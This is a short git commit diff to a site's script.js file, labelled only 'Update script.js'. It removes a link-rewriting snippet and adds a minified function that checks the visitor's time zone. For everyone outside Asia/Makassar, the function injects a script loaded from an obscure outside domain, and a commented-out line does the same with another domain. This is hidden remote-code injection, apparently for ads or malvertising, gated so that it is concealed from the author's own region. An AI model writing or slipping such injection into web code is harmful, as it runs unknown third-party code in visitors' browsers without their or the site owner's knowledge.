814d5dc50f68d8ded3b23ba4b34714adb61d3543
qunaladin <110922078+qunaladin@users.noreply.github.com>
2022-08-17 21:20:50 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,9 +1,4 @@
 //const extJS=document.createElement('script');extJS.src='//buckspanuelo.com/fZmiK2tcrVEkb/53943';document.head.appendChild(extJS);
 /* Generate Auto */
-Defer(function(){
-var btnAds = document.querySelectorAll('.ldApGm a');
-  for(var i=0;i<btnAds.length;i++){
-    btnAds.setAttribute("href", "https://google.com");
-}
-});
+function detectCntry(){if("Asia/Makassar"===Intl.DateTimeFormat().resolvedOptions().timeZone);else{const e=document.createElement("script");e.src="//colmoseshelled.com/rRGOwCkuadiSrZI/54265",document.head.appendChild(e)}}detectCntry();
 
